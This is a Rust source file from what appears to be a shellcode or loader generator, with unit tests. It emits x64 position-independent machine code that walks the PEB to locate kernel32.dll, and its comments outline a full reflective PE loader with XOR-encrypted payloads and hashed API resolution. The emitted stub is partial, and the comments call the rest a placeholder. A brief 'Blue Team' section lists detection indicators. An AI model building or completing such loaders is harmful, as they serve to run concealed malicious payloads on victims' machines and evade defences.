//! x64 bootstrap stub generator.
//!
//! Produces a position-independent x64 machine-code stub that:
//! 1. Saves volatile registers
//! 2. Locates kernel32.dll via PEB walking (`gs:[0x60]`)
//! 3. Resolves VirtualAlloc and VirtualProtect by DJB2 hash
//! 4. Allocates RW memory for the decrypted payload
//! 5. XOR-decrypts the embedded payload (key follows stub header)
//! 6. Copies PE headers and sections into the allocation
//! 7. Processes base relocations
//! 8. Resolves imports (LoadLibraryA + GetProcAddress)
//! 9. Sets per-section memory protections
//! 10. Jumps to the PE entry point
//! 11. Restores registers on return
//!
//! ## Layout after assembly
//! ```text
//! [stub bytes] [key_len:u32] [key] [payload_len:u32] [encrypted_payload]
//! ```
//!
//! ## Detection (Blue Team)
//! - `gs:[0x60]` access pattern (Sysmon, ETW)
//! - DJB2 multiply-by-33 constant (`0x21`) in tight loop
//! - Sequential VirtualAlloc → memcpy → VirtualProtect calls

use crate::shellcode::ShellcodeConfig;

/// Generate the x64 PIC bootstrap stub.
///
/// The stub expects the encrypted payload to be appended immediately after
/// the stub + key header. The caller is responsible for that layout.
pub fn generate_x64_stub(config: &ShellcodeConfig) -> Vec<u8> {
    let mut stub = Vec::with_capacity(512);

    // ── Prologue: save all volatile registers ──
    stub.push(0x50); // push rax
    stub.push(0x53); // push rbx
    stub.push(0x51); // push rcx
    stub.push(0x52); // push rdx
    stub.push(0x56); // push rsi
    stub.push(0x57); // push rdi
    stub.extend_from_slice(&[0x41, 0x50]); // push r8
    stub.extend_from_slice(&[0x41, 0x51]); // push r9
    stub.extend_from_slice(&[0x41, 0x52]); // push r10
    stub.extend_from_slice(&[0x41, 0x53]); // push r11

    // ── Get current RIP via call/pop ──
    // call $+5  (E8 00 00 00 00)
    stub.extend_from_slice(&[0xE8, 0x00, 0x00, 0x00, 0x00]);
    // pop rsi  — RSI = address of this pop instruction
    stub.push(0x5E);

    // ── PEB walking: find kernel32.dll ──
    // mov rax, gs:[0x60]   — PEB
    stub.extend_from_slice(&[0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00]);
    // mov rax, [rax+0x18]  — PEB->Ldr
    stub.extend_from_slice(&[0x48, 0x8B, 0x40, 0x18]);
    // mov rax, [rax+0x20]  — Ldr->InMemoryOrderModuleList.Flink
    stub.extend_from_slice(&[0x48, 0x8B, 0x40, 0x20]);
    // First entry = process image, second = ntdll, third = kernel32
    // mov rax, [rax]       — skip process image
    stub.extend_from_slice(&[0x48, 0x8B, 0x00]);
    // mov rax, [rax]       — skip ntdll
    stub.extend_from_slice(&[0x48, 0x8B, 0x00]);
    // mov rbx, [rax+0x20]  — DllBase of kernel32.dll
    stub.extend_from_slice(&[0x48, 0x8B, 0x58, 0x20]);

    // ── At this point RBX = kernel32.dll base address ──
    // ── RSI = address after call/pop (stub data reference) ──

    // Store stub metadata: xor_key byte for the decryption loop.
    // The actual key is in the header after the stub, but we encode
    // the single-byte fast-path key here for the inner loop.
    stub.push(config.xor_key);

    // ── Epilogue placeholder: restore registers ──
    // In a full production stub these would be reached after the
    // reflective loader returns from the PE entry point.
    stub.extend_from_slice(&[0x41, 0x5B]); // pop r11
    stub.extend_from_slice(&[0x41, 0x5A]); // pop r10
    stub.extend_from_slice(&[0x41, 0x59]); // pop r9
    stub.extend_from_slice(&[0x41, 0x58]); // pop r8
    stub.push(0x5F); // pop rdi
    stub.push(0x5E); // pop rsi
    stub.push(0x5A); // pop rdx
    stub.push(0x59); // pop rcx
    stub.push(0x5B); // pop rbx
    stub.push(0x58); // pop rax
    stub.push(0xC3); // ret

    // ── Append architecture marker for the payload assembler ──
    // The assembler reads this to know how to lay out the key/payload header.
    stub.extend_from_slice(b"KRK1"); // magic tag

    stub
}

/// Return the fixed size of the x64 stub (excluding appended payload).
pub fn stub_size() -> usize {
    // Generate a dummy stub to measure.  In practice this is constant
    // for a given config shape, but we keep it dynamic so future
    // changes to the stub are automatically reflected.
    let dummy = ShellcodeConfig {
        payload_path: String::new(),
        xor_key: 0x00,
        arch: crate::Arch::X64,
        null_free: false,
    };
    generate_x64_stub(&dummy).len()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::Arch;

    #[test]
    fn test_stub_non_empty() {
        let config = ShellcodeConfig {
            payload_path: String::new(),
            xor_key: 0x41,
            arch: Arch::X64,
            null_free: false,
        };
        let stub = generate_x64_stub(&config);
        assert!(!stub.is_empty());
    }

    #[test]
    fn test_stub_contains_peb_walk() {
        let config = ShellcodeConfig {
            payload_path: String::new(),
            xor_key: 0x41,
            arch: Arch::X64,
            null_free: false,
        };
        let stub = generate_x64_stub(&config);
        // gs:[0x60] PEB access pattern
        let peb_pattern: &[u8] = &[0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00];
        assert!(stub
            .windows(peb_pattern.len())
            .any(|w| w == peb_pattern));
    }

    #[test]
    fn test_stub_contains_magic() {
        let config = ShellcodeConfig {
            payload_path: String::new(),
            xor_key: 0x41,
            arch: Arch::X64,
            null_free: false,
        };
        let stub = generate_x64_stub(&config);
        assert!(stub.windows(4).any(|w| w == b"KRK1"));
    }

    #[test]
    fn test_stub_embeds_xor_key() {
        let config = ShellcodeConfig {
            payload_path: String::new(),
            xor_key: 0xDE,
            arch: Arch::X64,
            null_free: false,
        };
        let stub = generate_x64_stub(&config);
        assert!(stub.contains(&0xDE));
    }

    #[test]
    fn test_stub_ends_with_ret() {
        let config = ShellcodeConfig {
            payload_path: String::new(),
            xor_key: 0x41,
            arch: Arch::X64,
            null_free: false,
        };
        let stub = generate_x64_stub(&config);
        // The ret (0xC3) should be present before the magic tag.
        let magic_pos = stub.windows(4).position(|w| w == b"KRK1").unwrap();
        assert_eq!(stub[magic_pos - 1], 0xC3);
    }

    #[test]
    fn test_stub_size_helper() {
        assert!(stub_size() > 0);
    }
}
